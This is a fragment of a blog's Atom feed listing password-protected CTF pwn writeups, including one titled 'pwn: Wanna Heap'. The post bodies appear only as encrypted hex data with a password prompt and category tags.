117f946026a296ec8e2bee003599dcf2ca0e7e0fcacded149d435a2909c2916e406872ec42828e7cdf3a90d1cd446f7dbe27935abab28d27237c1d8f3adc6d50fd33d06b1a401857388a320fc2407581f5cb8a2f991ebfe0ec516a92ecd20a7c83b7b0e1c751fd75d5b182a23710f23c4505b10be6b6c39af9a56c851753eea023b0e7d213e53f38fee90633450e4e1f7d974ad1078c8883a7800af282efcee0fe476ef21cb5a6b42b928c91f7a4ab0a236bfd4640e037a87f04b928bbe433666a810aa034e0a4027533480bf346ae113a1911404d47230d0d126eac5b506ec64c6b7fa52ecf07a3580ed829f6f6b2df34724bbde7b837d925bf0ed35439e0032341a8234a885b665c27a5fb001655f2570d9919e2a39fabd4d8ea52de0e3781016051169c0ba61f007886b3b21eefb3ec5193a9ec149b3a8181914cc3c7b4a4411de1686da1158f4d6250d79752186f5779b539f8b7197e97c3c1ce5d2e8e6bcae6681d0ffc482f9b380488d77ad1c6fa75797366968b8ac744df19f0d37b5e7277e7c515e21ce6f0287871f68c03f6b8f971c0c685259e26a6f1efc340b1369ba777a75010129c29e3225c53b5a3d2ba14bc4a8a3d84ace40db8b682c1df4d59ddad7d8eec956ded3949f22269441e93ef486dd8a4683e7d552d7b2963175ca8b5b395bc1866c1f3c7b432b0d61947542454de14c7326b795c1cbe66afd3afc8800c47d322177b3460262a8a021148d51b23bb46c76b590e97ce37b8f6656486bec82fad09b658bcfdd88bb40be60d4cb4fe2ed4888194dfae3fcba0cb182b1b6eb01e6b93f9f73ef945e1eaf6a5bfe3515906998d823937e2cb35b040fde5e73552020462e0fd990d5831ae33bfe7b930b2a125377834655c501a3602fbe775c6b40c966f53159d5951382cc0fed7bfeda56201b59c712d0956acfc059aa5a15147d533dd3192feb6b06939bb421c906a7dc6e83b30a24282993bd42cdebf13fd0077d1736c38d03bd69fc6581e509308d6a8c7c8ca001f0b6d7db4f82eea98177f73a0f1f56e7e1f6dcee0c40b8e51e368542612a91fa36c6a637d9ee9c226824fc88d9678325c5f7e9093fdd1c8a8b6c63e931a226b6c435cd2307a636f7d1d17f944088dfddcc58f62954a4f438205f16a4375bc056f5e7cffcfab16e31a68f8386240baf3220fab06e9b90eaaa744204e487b35493343f3135a2135472cc1228a14d32e463ae3dd165885b6b02f4a33f0c747d816d8bd580921f4c02defef172f0ec574f0b3cfb71f180ac0632f1a294f8222b84f2d96c03ad2d78336cb0a88c78f1f0ab154f5bc7587572d8feb2a679c3342f758f324a162056b2d45c746047eb97a308554bd74f5f9b2cd4d33c95c43e9dc8026e3e057f2c04d49068996b66f9459e6fd14739663a4c96da06fb6fecfb10d926d00e15ab71fa328a4031fb56c9efe4d8225ca218c373236db1dab3c787fdd0d402f056991cd50355591ed716f36c4b64ca927e0494d58655048f244d2059981222fe0dfc000888e9f9ca889aee0ad8ec5e625e4a96967410da8ce14f99372f36004ddfd1f8e4d9f02c597ecabe6fe5dd55f428f46f911cff58a66d48139808d6a8ad132d3b60467c4ce0605ab498e5b57b2e02d19a979b550d7a3b5e93837553d8171146625904e3a0b953908b726a1cee221a0e7a8d085c6d365ec2d54d3bb19f447cf416f3efbdbad2fc75736b6c89d81a73973fe10fca5d8dca6e3c08f85ed15407d43096e038be28b8d178e3f22fee4e0baf3dbca7387e82366e99a296f2202aa1ddea95718b22157f93940a074b26c0a3cc101535244178522105270e1de352099483222520d7843627e7daa61b4b700c30091dfbcc86b1744f78b376fa0cb6ce49789931d95068f3442cab3574726f7a688a5edb8309bf25f6bb726f0fc896514da757ac070ffcf624726a0a84fd8d4240f97c2082d8dbefcd0528ed37ca844dcf0847fd99ad8d99197b91e3787dc9530d916e241614c4b4b172616c8ba28b5adca329bbaab705a0c7d5ea9b1566869f7b2c06b13aedadea173ca07fc5752e95211e1ec43baad2e760464e8cb23f7e0e65245c2a06bf763bb7514d7b2df7ae012d0b6bd7ce71d6e002df4da9fce02e4c3a3546dc575c3376a36f588549691e2146d4b5134346469f6ab58ddb8e3288b00db15ae114079c69bafabeed39ae05f8c03d22b0f8a6a2d3c9940ec96b09b4b053738dcc8af424f83532f8e43331fe227fd9302ea86ad8215293bcdea0fc2ee8e8a32fe4a1aed2767dca922f1f907923720bdd18fda7c93ba55c564256f8118d534ad0ed0a3ecd8bc7908ae52bec3515e659e5d1bb2a1a3ca2e97af4e2b03c5678d08c75b0987243d0cdc223f45e8eb19d2e951987a59de710f2a9713fd435e703cb646e12accea9bec2e1f6d4322173b3329cc7a11ce581cf0f677cf2b5c4e6b02de51b6ec84cfaef6d73b3deea9aef5228fc723e99042c571baf2134a863272bdaec91861270a134cb31f77b50e4b88036b3d1cd7f8295357e1029bda81660081299b1b3260caa0d7f72992800ec3a6d62bee9b179188c3f7ea67f80f1ef5e6d5183999b69e55ea83cff74e6e34ba7b5df29509dc7b42e24dfcdf1cd0e16b05600f6d824c722c7c7541904431fff57b90d54d442c23ec1b44229b48bef3135c78c4add326fc699fd794b217e88e3b860d094c715f8d7af751f07e05229b5a004ac39596f8dca661309e59903c7860f6b6e9f20d297c3ea5788c5720ddfc2118a9a5606a441327d97fbb3c8323f5919b9c8611b0d069d20a5bdc85127f644d6fbdcb49e7e31a093fba93263ebafaab8595521ca6cfc3de92715ff733ae3ff7c13cfddd161b233b23f170e33c969bba1df2bf5973de3a969becb398f1b9dc88cbe3a8a6a50904ae123862f69d69f6ef4762923bbc93880714b539c626cb559a6ff72d3cac658d3fb56d9b5b81464de20602f3a0c511a2798ed7098098b6368ab1af25d135629ee6df99c9cd0f8a67bbc9a442574c86cccaa124166afa4b74ea4fffbdc5f2dd3ce75e0080f59e57638f0f4bea5a3bee9693f9ba7fcf75c4dd793a2220c47ad73399582db045677d6d887267105f20fa1db6eb987c1766d52e67af5b2718147d6a76bb9d59fb354818c3da3aef839b643689c11010ff455b485ac43e0fdf3a8be6d71b0e19cd95a3e4b374bde93c400c4dc6043a7f3a6d06d543cbb8960213e04181d436c9d1d8d250a8612a86146ad4ad9e92f2ff8b8b6cfa920a05d838228ea8686fc3d736493531a44cebfb015916e500661a0b1a1a756dc7bde146e07fc8ebf5c177d7614ed5bdfd8d2e39eda34ef9bd0d47b68c0937f42745559c922b0239fec4d26473d9cc9c2e8f5381906a3c7373435e66b1cb181bbf225def36797570d6de52e45b84ea80afb9dd238508a9ec9342e0024b20733cd1913b5dcfaf6287fd9d0e98624810654875fc182da7a5435292083c664098545b98524d42fce3be809a9855f91af5e91539b2857de7bf9d0569ed41609269bff3f4eedad98aaa21fcf14de02515cd351d57540365563adefe15981df7f577f2fb735d92d5f6203844f2c4c0e3f70638a3e7e1235805d1636af1fc50fa7c51cb8732567a9776414fc3a03811c618de43eb7a00112c8fc9693c566c1679b0c5fb006fef5af603995dc1e9b1de6ab8f9e9bef14e9e3ac94e58b51f84aaf4074a6888be4113395b6fbeb9c0e47e5cd56af95ad27f045aebacb77dcd0f1beaec52a79624233337db7ac2b70c82b2066659d83db3e116f36b766e43e732950bfe2f2d377c8ed63849bd3bbbe1b84216f5d2109488fed974455a9aeab0a8d3f74bdf41402b3750de7e16e79f6a7a669809ba824fdf9bd8fdbf9a0c2851708c4569e03dbfc5bd9a65ff54c18d69d2575d192c6f107237cd03e2f8610309671fe5c8b8f5adc867de81819291b4274003224fb0552c02221dff668073b231f5c4eedc00c0e56faa2d9ccc4e473ef47dc8232aee5c4ee508f3d1007f12a86fc1fe3489eb997be6e932917e6088d7ae8fa6b6a55982c2429128074567b641eefee61d5751f22e18661dbb7478a1b29b2d03db30e0f9250c747c4335b828f555b5d7139128bcec4d9d733e85699e3810ffa0e24886520611256a8c5043b04352385b919c8ebe6852cfd9fcbb2828dff982c47fc7b8f367eece4945487bc2330aed46fa3df4d1c5bd3799b63d5dcf60b6dcfccf4dc037fb146e7c854929caeb03877a135450c8d809497807074deea4cc4a002c6d9040b6d97bc1a9b4673eaf902941a0a94a65afb7fb4111eff61986654b8ac03afec90d43da6f7b43a4ac7f0ed6ffca6a419918efae8a2a02c5a6a74d702810b59026b00a6be4f983a940831d9b1a2e43edea306a2bbbad6aed8d67235698867e46dfbeddbb47ea74e7046edcf8be992c36df0dbe4827fd295ab56418028e473ad06040e0b485302c34af3b28cb023503bc1481b20083db572c651b9bd487f4bbaf2b91d4f48d8736e37236e32a813595f895a52b511e5f89a32a37d57dbe7324356da0e26dd368c11d69ca4922ed218ad64db312fffee484985601ebe7e3ca3395ca164fa35e749381b8e1f9630751d9d83a278b356770cc11987d7f1b73bede31b479400f7950d667f474f196d019f39def1941b910aa4b07b6be3444570b7ca3fc75b502d6514cc9d45e666cd60a0fe2f1fe8b09b3f0edf4ad88e9165c8081aa60c4150709eb217a28d36f9342c54d00118f1c10fddb55a979d7960d43e18e962234fc4a70fdbe2d5af4ec19a8bee344ef5fbcb310b2a551b0ecf70c1c67f058b3d6e25b5f4ff8ed1390ac7759691ea5354aeca378562b7cc27d6668b82bb7598d854a49f6b4a1b3590d7151a4cf860e3a46d755f308ae7a4e063bec6eebcb694bec5bcee1a4fbd8440a252d945500b89f24731ee56d1c4f3bf605b04f71757be2ba6e1e6f7057f159ebcc31ad76350baf08e694a47b0c0158df2d1cb70c915211a6babbebf27f07ff457a70066fa0f29b9e340a827163afb666b0c0098295d3126dcb075dd8a6a9f86e5ccd7f17965580404e0cf425b88a8cd9dd19b1059098b65f638e254ab4c0350b0f8772d2980f730ca379fe4751a079384c6bc8e170bbf67034dcb0a83526647eda0f9aa63b5e931c252e95fdc51f58d68465f62fa0a365d3926f547f92ccd0725cb095c3d1654738a12bd207e659b121f42337c2674d9149e4f775e5e6a8c15ec05016a2e9e092e05a4c487b57ee30ebb955c4f51c8d5749b09f4603492f23211bae26698e626887782e21facf5b1273af2f760b54c15283973c29290be3a5ef0dcf5230da66a2058c9eba39e5ca562c1140e1ee483d1a1dc33ee6baa89c810a2886c37d7240848d8e8f54850bd2dc422f371f367629d281e4fc3344ff1f3e42a86de3616de2eae86e1af8eac0760ed0677fdb52436e51ff713b1bb4f2d81357c5d877ef33816ca3bb54a51483a0ebb72dc756522d488cdf2c0f560df3b596ac40aa9837d043a25d5c1adef851dbafb8e2370cfb2a5232a5a959b19411112f9c07a27c0ed3c2b4e31330a2179e83eae5fd0274d918d899f4744db13e9b9f14a47d08929eca697e7317057d07a1a3ff71ab33e5d86a94f58211aa1a96b72bd03e3523b1425d7aa034de2e8ef0d9655d057e9397e06f643579a5441f09b65c863ebd0576de26dba9d237a369154778313070a13d359e462fa557f129030bd368f7701c39085f36733d67ca88d21877bef16c7a49dae4bfc3bd56323c1ee3bf5fd3b5fc24cffd7ac1511fe5a433a7de11adec133e09ebf585aa7afd2b3069b439fad73051feb8cbfa760a02fe3da13323c858016ebc4aaf4bbff4dbdf580321e56e12a432079bd693746fbdc15d2127bbfd66383184ad1c2ab43f31c6d5b66afa57525b8d0bc5a8834f44c3282cb6ec83dca81af0c528feb8b962eab801782910c641a71942f056934fbd7da357a89a890b4757c5e17328c93ff39ee66e2bfbdbc46616045165557331ba13f8e194d74261218174366ceed387df1ae7e02109ebeb19ded817def2bc010d4e8204e975a21a56324e023196d1498c06be1ca2c04d3e85848c51bb897df9f80a8c472625401bc881ce0c60b771c4924990975c607b788df072dedefe0e4b77d6a7416dd098b55db3f9258c31c032f6004820cc1d28916eee57058988ff8c91a4c58e873ec1f02c09ac64f81989ee4891c92e873cf4070dd6abb532fa6ef2230017af66a9432b20438eb69597462a242f689f35b30581902ed4b967b5dac5a8c6477d797d6469eae33fb3f4253b3d090c74cc29d366dd8daa872aca3cbceeb4f880e7760840c0350463ae6675ad4cb341978e5b1a4eb522838c65aa4656dc31578eaa427376c09347aa32d72338e68e47b9a41590d46d8e49e6a3a8fcad2427b8ab50057c971527b4c3f287f2ad1dd66aacd0de5a67ff6a8fd236dbd2d5e1cc75d586d5159d752bcd9bbc2ec532b4b64dbe94aa4950be991aed12d57a94695f769acc9fdebfb3d65f02982a735f5dacb77a85e52ee7139ad5125228e77a9881c0acb0efb569632904e25e79ac7732112669d0ff9b99713077c1b87873935c048c08bb3a9ba604ac1e91c9109d74ab3e7fbd849605a62e73ae1a92382b7bf52ebdbff68c0bab2b7b5412f2b5acc9626df63a040dd52a0008788faa353391e61a0c14fcc192a50fe9423d77379056d36ed1df40b72d1d8213225c962b0ed05f17502dba08c1449b70833189c24c1c797f4b0e4c2761db3eae82980ff9e0051ef42ec1afad5759815faeaf894b3ced3f3a863105f9112969f43a3cd9e04ed45a95a06089b7715cd0fd3a7630e04447c120f428591f5bf8cd89f53c58ce51f9be8f8477d934b5d1682f70cf7e03af8d7a05463475319ef982317060cc5bbe4acfb0ed8918d68ef8e20f0711c167b9a14768bb805d5d5f764c776dbd776e1b3247d84637bc762b12b0a4a7df61f84477083d7c4b40f6b41f21c1c922b88eeadebf1828800dbbb7bbab4e1b65fbf8388016e70ecbc906e13b842f166cd38a84417d1f73083427e3d5cec5bb54be442272e9cb7b127b0a4589c0e0c6169cf6fea4975c4e8930e8afd84f8b08bcba1e305fe112e915b75def3808bccaf19cc33f48a6a39892d4754b30d8ce96ad05356ccaf228d5af3af2c3bcc026172e738d771f901843c6ff6ed42f9b048dea9085eae429100abc4b69968fde0b060587cd509d8b0939562ce8deb759c08754ac77f40ef51e1e31d86576fd72bcdf930b04155469431798a0172796bb76711ca195cdfb0aeaf0b62c8f26b46feb4008c25907691201900f6fde20d166a90d7fe24a93b6396450f2723f17ca83786d92514c9f7c6969bdf93ec3459ebefb83199eb73a0c576831a5073767ad3e26c091bcdc5477743fc3b8b66365815b2d5fbb31a91aae34fca28cd32d152238a8d7bcbcdfcd6dfe8c82acfa528d8267946413fb44c2c2ccceb399fecf10b728dbf175c83dbfa3f2220d12e4a39cea3a4e3898c8f387d964dfe84b4574fe8ada8bd9b56caf9a46bfb366e8c0ce39536a1c7d2e1d92782610c7255c748e4c4f89d459518451a720125c16a9c854c85aba0502a13b81138a9d28de520027b4f84998cafd493438d496832df0442e3af8b942a4b234daf9954568c873919407ed3d8885b53249fa4b510fe799274f077895b1497fce5096c1469c5083469c95e6dea5e5768462d752fc1fde746cd76a8d6ad201bf4bc4d6dc06cec2276b44301e4bc05f7c210ba5e2737223791e232322c135f13ed44579c8bfef5edfe95e82d4702bf1b73d386bc9b891953d825bd140bdceb1e551b14d634a8b2ba281635efa3ff7e9009bb66eb19464ebc17b2a09e4b64fbb6806e7f25ba6eb3639a156a1c830051ac390a0a935a977c3b3c815755677528b00320f94ef365b01accc2015def5136f2b831c78433b1ab1dcc50d69927c9cb1783e69cc074368fb54869b52e654affe13735571e981b2de90ffae31fb38d0bd4c8efcc02c5b0d5e89b803560ed4facd2de2de5a0d880d734b2e40ed255d872a8e7a962ae721b1ad48bc235d77072fec801b6697ae5a18936323b8c0dd8855086c2161dd71fc22164a150a9f402bd83373390d34039455b23875821033fbbccaa63d5aa035c802b8a69acf3d33db166b2841bbf3c843062da095e3c1237521056da255c22d984c63cb8b7fe56d608d0409c9acdf7745e216d12027da6a0c44e7e0fc7e838ba24afb19f34ee8bcbb4d4da008a639407ce34bc14bfa243ad58628aee199faf4abc6647a57e6afc4636c34a8513bbd0ce729fc2e609b2639b35e151c72f496e841661f2027b76a2890ce94c661fbf7181caa9845db8da7fdc3d8283acbc4a9e0af0aefabea5ca23f7ab1da31c9773b95aade3aabc1e985e845f14de491c07cb96607494e53dcc0594966528417373b2f09e8059f14554d5983ce4c0e41eb7ed44e3c1dbe6575df7f96f84e8016b9eb7ff8fe88ee147457916b1e6cf864c226c7bdcf7613182dcdda126374d82719b4de639ea2bc551469e2ff1630c2c9f185ed6c765273b8c6154975cee5c9b22b3dcf59b356a44993819216f17f9d75c790e8a5bc3ea5e5c7f1df80d8e6a5c0c5d2c6095d08a067436a74af32fa91b28f7e15f267a8e7d681a139e4fb287631b61fb306f8306c5ab40efb2119c2f3efe580c32a5858bf23f1463ab96a6b7ec14b2b0dd0ef550b097179e4286b2f4b0c609a9e56e947e1570022c13f2f8c181cff708ae67592c7e3d61cb655005341e131f6d6c2207d1763c1f1963d02867292f3628d1f043059dc9ea4722dedf1f104b65f98631e121f6ac3e532af94dce818f690ea99ed509faba816e0d06ea590bf776fa56d35e1277875aa3a6e9f06da77aeeb7867f17f0dd2fb5fc216c73fa0997c6c1f143c6a21d4fd09cb809c202cd559c21439d700c0a7eb1ee3fa0332797a0f360725fff116ea85123d879ee7b58a781b82257414b27f57168d0ba927d0a53fd21026564158b7607696884c61b7312738e9a1666a800e70772c9eafc6fc0b35fb894246e49c4e4095c0cca305ca6d2d5d19ee4f70c2baa361a8f3a52e95667f909cf780661c6a1e614ca4fccb00d2fb9734351dc355cd0eb10c9f1c7e82356ee4914ef102ae640be4f23d689b61f5935808e9dd84b7b211f8442a1de82eab4fe0d8d422dc33862fffda18ee62c3cea5e3b5067f1f557e9d771b7f56f364c8942438bbce90ba7734071860acafc12947a291b0d8c01f0c91271b688809640c1dd7947be03ff4fe84392cde8264e3445566190c569e823c08e4edb72858951c2714f55fedf99cc419946c7fceeae241ea1d909fb18ac6c542821f061f4873e9cbe65a6bd7a9ea17023f10054977713ef41f718ede9cd5db51def10b8e5bb7042c87fdc2b76a945bca4354780f2abb942bcd88e6ff7818cac18ec03d50d4e9f7c35b54f683502381000b3eeeffb8f21275d339d6d048b0ad7309a6afe972e32647c173c52eff177793fda63e46c8089bb1cbdd465ef25106f6657b658882c2b299aa94dba451a38049903d9f2fa198483d718c8caa097c9fb77f9c3268710e3559dc0983f0c8b2fbec4add3818d1713cce277b9ca0632ba1b4bda62d2d8fda89bf45ba33b313bc3bb18239cad6038380b95b1eee55b84cb42ed697a5c6b04d332d21e2c2abde9783b882be2dc8e68903678a806f736570e48064919c7758a177d46b05dd02cc879070c66ed667a46d965adc6c4ff65fd07a7aacf087dc854f3a972b6e88e57bda7655bd277d2a886ac6ae0aa34be73951300e0a836abf15676a207a711c8dffcca4ef0fa961475a4add80bfeaac32b283afae74e2709ddd879cbcb1371634e0bf99a01a6c0475318fe36bb12683f85d82931985f2b3ecf0b86b87294737df49cfffa37b6e695aae3137329627343f367df7b0aab99f08d8edc545bf6cb1e9789246c94e91163a3222a2ee9fdffd104944adfc754c09171a98041edc120f979f4762579d4f41e164b49bfb911e3c504959d4485ebf4b6d5d4feabf5601554b5776eb2b1f916749bdfcf205f6ff382dc039e7b72c12739eb5594d3c0bfff35c88c845a7f8a84ceb8e4de3da8bd5542e92a504bb2b05ac3fbabf409b1c1fef0707489078fef3f22f521821985c67fa1b66321af289213f9e8d19cf4563e42776e03d44b51ec5ed0f4ca7711ebd4d528090b1092d341f380803914c776035412e563011aa1e80dd562a3990b758e725c09a8f26271bf33478be4e03d94c3402b72b402423fb191aebc81400db01d7e5565772ac50e8a4debcce94d107faf62c43ecd7c9f3f5cfb376ea45b5e0a78d6373f9a49eb047ba4ae73bba216ebf02dcd06569302e5a7e1832c115286011085efef017b2508274d53c4521f404f41378fdfa3595a8fc752107d89a5b7c9fe0468b2a81a139430a5c17bcebae4c65abfe887f54227b6e308b016195b07e1ecf5926d42b3495e2f94697996a58da1aedcc3635bbdde65c0d568a10c38bbc76cc719d71949320c929a462eb8f582df4052f4843af0863b2de3e455246f3ba1df4754d0db732568b5a44fb4bd88cba5740fcf85b3123241bae7dda2833d62a1a307ec1f3749a48f698d347a26672ad41cd1f8388db6226a866a24eecfeaa0cef59f2894f17623aaa1e96b826300653ccf4f6387427d3f3a2b7dbb242dbc2530108caf932bbd501f9751ec0353ff6969d9ea005295caec369981088e4d65806800b258346e99c73546a4a8f88f8a99632933aa9326ea4f59c815098efeb6b184589172f2e1a87f614bb11fdfd4fb7b46ad8e465b32c7bf047fd7ff4ee8c873cdb939ebc6faab6f001adda59f7d1a895071d13f797467ec7151bb999f057cbdcb19b51d50a198cec5dbc2ca0ba0e5e7878007225a38f880106ab486d56f728e90ddd31a318a4d06f58a9fdb95e1502a31a5562a54852cd427dbbdbd7ff06912da27c42ccd8c7e37302cf0efe8a9e3c848464c6d64d74e4c51e140678b8b78495c552def51bc07d50a565a8397389e61830dea4066e1da88cc55051c6bd5bf9e2ef129f2ddef10ef33bad766525ffc1f1712972272cfb52de597a4be891e855076628190aed7c848c77147bc893ab1918c174d4b2890d255d75a8992bf8ff90efa2928c6beb9d3560071dd441a2fabea7447d941ad618b644314ed45c1bee2e301858dd3804cfe2d1a964a8bc9cc37c03e31483e4d07326cb2f460c26e4a3b48694a974c5ebc232cc5ab64542e72579997bd26a7a092d245926f74ef95a3288bae65b3a3d074b38236fe8fb2ac757c0eb5267de945acae4e3b51419c29a91b2c40412275bbbdfbc9ae446c755b508cb9ba82965afdbdc6db2ca08165926f8833ecf23c3999cef5408f3501c45771ca4b451e7b330e50b082e11402eb649efc7c3e3955645a03d0a0e115bfee83f7aa2</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn: Wanna Heap</title>
    <link href="https://n0nop.github.io/2020/04/17/pwn-Wanna-Heap/"/>
    <id>https://n0nop.github.io/2020/04/17/pwn-Wanna-Heap/</id>
    <published>2020-04-17T01:48:47.000Z</published>
    <updated>2020-04-17T04:32:11.462Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e4bacdbebcdb163f60d46adb904b1230a6753871ffaf3cbe940c092dde849f15">908664f8c2963b426ab4428723edd3b0eb9be8740ec384b289340a4f5b82695e0a40d6d06f7dcf2be93560c7a39ab2fea1ef67e83ddb5eb1025b2d2fb798161125410a6ad3313523ca03ca582a3cde46fad62634f3dd68d3b47dbe1e8e28f30fc833f03c757eec6e5fbf37a0caa37932aef05dedf95208a0dcf8bfd73bce81627eefb056cf64c328526074233be1f1b648a175cd13ba7c96a4443277fca0e1327f12b636e473892c5c9ff5f2050ba565254fb2053857a4a86600bdb3563cf69285693cfd316eab50182e97d5f446aca028a946210c1f2114f4773a42e79f251cc6afc9aa2dc21a0ceb0d80d346fc7e6905ee5c28245f438b8806516f22953fcf5d43dfc8fe8906828d732d76198c1a3b9d054c24642e8a783ff5fe55552f38e65ab64be6b0d97a5349ae7d28ba84d7e788bc7e0b8e060b29ff64e9617e09790a7abbeb9c5bd5147a8236a160cef67c72e137b83d2c29f0390016f381f76fb5b4d552d4a71508e955b1062d30f22526fdc66b03b0889b7a1f81f05548d3bb92fa3fdc632269910885971cb1a0d894a11dc9964d8b675bc9e294e7efb39a645c00409679a3dd7950d49d8c656ed91da70692d173fae8f614639414fbd094bc82bddf4bf55f63d3260fd1a3ccf1913523fc090cb8ba044a184f4d6d29ed25c3c0ca580b8deb7874a150a15ef8e8750878f1e3b61c473f88b1c542d6c0e4805576ac63efef67c01848d0a46338592b4afcbb4160420e22321eca0258ee8937eca487fca13b9586f37360f21d8b9db440d04cf0e595154b8dd14180399cd433d6125476908f1da99788643b6eb3db9bc593241571942a27deb61c01595ca21dc6e0807e32aa36c965a58897786cf150648e57a2745b8029faa9b4b9dd0dc8eebb9c08c4bccaf8690fb9a7a27faa11555b39af900e30e2b9e0f0000daffbe8410d01923f90f14f9ac5b9e2f30b27eb0a68f5c57e3d663f4a1c997cc16beac602071020e342dcd267852b1c5fcf19c829ea2f5f4872f4b1954212f3e6aaafd8301cda93347d0a5401af1f29c46fd1f268dc90401b282b229943945746687965ae68fe5facf5c438685c53e65444097d2ee2d8b0418f255e9926f27d2e2b3ba1ee4a12e180087efdac8713922d27c2b09ba4734becbde4029bb21ebe8d56c205a2b5d000c576769085d373a640f281d6b2186f9a01a91a76cf2f880821da79942f6e38feceb933c3bbbb52bad77c59bdc9aa94c8470e8093c760312cc2482245007093f64c06a9811c71de9ffe176592e58c7953a8781fdfccceaeb6ee9bbc6f6c96a80257af4f159f4342f825aec9c272288d6862dfa04881b7f565384021879685080e92dfee3d7b4aee1bb983ad530b413e238ecb520465f132cd5c8bbe2776903f91c1acb193b388707001ccde4a2b5af2703b8222a153dafff40cb60428ce1120246daafd9bff21289de19aefef4f7e3e2a4adb6333306b884ff7e9c3e221ca89e21835a8b14cb7d6c450875c8c8a2ef80deab055de14674103351d7691e3278da392397425cb89b9d947e88837ab93adc2e893cdb3ce3e3a25b5a2e6c76859edb814c6fe1711d1c90d5f40310c8d0a62c7fcb83251b379e1f32276944ebdf5f3ab8fcc87f90b6d8943356f37d6c8b5edcc2bab473c5a6a9fd989135f0070db7626ede31a930af321049a43f10032a365f5531fa22bacf8fff678416bf67d389b6b8af23536a568dc2b3471b73efc9da45ac5e42070a14c3f38f9f6fd70c3e6645898fd80d9f8e89ed074388741f47bdfd2eac48064e4a6be3157f99830a949bec85d705189f2cf70cc3bdf9cfd272673dd56cf10df89f0413f78add745b2e3476ccf7c371f39fd170126c072994375e35227804ff18448ab2eb501a8865ed6fa24de2136bbb125f5f0e10ba4f42271cdcb91b2e365e3d022671b560b44335b62ecf0e874dfdc45d2d37f2f0faa8df5a784aa6cde1d160db2ebf6e1cd0ce63d0a8563e3f4b57a1110ee16d73770993b00f585a6a66f9c4cf3ad77cff751f6baa904ef8ec4f0c8aa5c48b36f72520a7cb3063d0fbb2b9fb65656e05bb06ada7e8dd542e1f22adb1da7af6bcef2a7e5b1ce1c2311cd13e48ae399ed06b84c422a9e0bbd34a50e471ee95730ad8624eb84c68650256ed586057603b2fec2bcac7f6c12eff01f342f05a958603b0b0af7993ecb732a0b45b9dd016be8833f85591ddcf38022229f48980ff6f40cb0c70e30f2668af9c0bf476e0e578b669f1a5c5dee264ad841e5a1d4140d0c1f08d4f852aba13f81f22fb564cfbe7f091b97dac33f9fb5894061f70b35a5ed91772b7d7d098cfdf0319e4e2c1020497139746132d2e3b0ae7f259d12badf2902425c4759680af294370efb04ce8d885be6c6bc07517db7003b3f58468f1a2116d6cc2703ff9558597bab394d0d51735855747f1e3118209297486b8d3bae749a6259f1ff339d248311f29a1f7d4a5b8f7f1830e2d1e8b0687ca562115ffafbe9bdf3fd3d308cbedd07c608643b0a30407fe87911225a712e79e155b40b6ad633170e4206ed66552e45401e05984ab01943252d1f65252070ae121dc4e224350bb760c7db3c8ea9963c1819435447776df4415667ea2c34ca5df4170e7c3221f0882564bec39a660ab6261ebecdc215c54003dcad1ed4cefad9762941d2a8c990a1fa74b38ac5a480f8d1eab70377ec57a5134ea1aa1cdb4e28d6eb476afadddecbf3bce40b55fbd472e0f124e446d6b031481e3fcea8d19048623f438b13585e9862d458ad01a848b38455deb83d824aeeb4e60e995f17b086b0c266fc92ef7fccea73abc996f5bc3101f02e6385307bec7232a6ad954810b67524643d97d9f3c3a6c94b9d550af77bbe78f7d770f5383b845e2f1f1ef1386d82851fee04bd83747ef16f1888e95e2a9bd5db3bd280222c4f41b2b9781166234d4600f4a16ffda949c91bb9d32bf2ffda393a4d36054d560e8986dc0b27ff89e92d4874c012014e3480dfc046b0c5ded73a28a45b2e4c1b09644b16dfa770a689023971cc51ccc4850e1a228f9c06e5a8f5f832f9d53352e01b301dd33583344068868f5b8fa9bb093c377dd3bbedeafa93fca34188160457d686a492d24d6d20c907d8c83c01fa1c6960238ac73c26858b3aaa07a13a1264fe1e72da5cdcace60a57362e457d7e736b74bee74294f852fb6852b7ea723777e452867b3700624b031482791b52b56707c616d894d337fc3d116727a9ca0fa1544dc7d578753a17c40bd32972f320bd043da9a08b1e110149e226a30845e9b2f625a05df3c679a133309e9aef339dcefddac5795447e16e3dd385e1960f94827c5a9c19a43c0a2b1806d2d1ba1df8179d6cc9ac937105f239fa2305b91b3779952b4d89047d3b3de0ca2e5d4b0b2c9b13d26e532b3c2201788f5fad165dc7ef8348a4a4f939c9f22eb5c8e1a49e8eacc563f7736db9cf4947723a5f880798bd1caca62d26934873e8c3cf5007c10b2b0145612f43fbf170d3551a00df51e7dd2668ad69565f663b38dd30a0d664be3f3c3c33e06914426b4073b73716ce03cb2fdcad98d253dc584c398128b0f39685637888185f6d7cd5e8304d0883e5067df951dd2956ede04cc5723bbb906e48376da5385825de963d5f15545c10cd1375cbe9724e8e1a2185832921c81435f8f3092844a673ff1085a488369c4ac7784106d8f93eac7bce836fc6d50bd8a959cc795848d09b414bfc5b37483581487eac3dd2bfbbb9cbb9e4a38394e45578cb82d273bbaf8238b6f7ce4121e33b03a9df28f8c46f944704d608b0a2688e63568b3612a5d8ade1619d60af1fb3cce40a0b9237f3f64a830c4f36d0c894b91ac06b1af73bfb258ecb1acfbf5cb240043c7b071e0a18fc6dc66428428fdda4caa072527a1abf5256b898cd219e2cb7ec6b03f97bb67f5725f5352fe1df90570c948ba5a71ce1543a84fbfea31040c8d3518f952b4c7201c2ac903c7eb1150871fad3f87115ae34cd0ef48472e31bd5ca52ab64412e2796a4b4925019cb812943c3c6227ee444ade3e1a50cbc07bdf002dc43c6902da8723c3b06fd5f377f6f9f8919c5d15b633b07d64b9b4d83187899dbce4cb24745c000603ddc91409ba64061052ae77ef558c2bb88b232f34088f9b8c0123a51d2ac601da4d001712994e3afccfb64e85e238cad714cd319f10861969105c27308116f29d85e7d444d28ae5b551fc3197ce25fa8ad255a18a91d0f14609f16c3485df2ca092f67fe418719e574e122adf56d0bf06c70e5e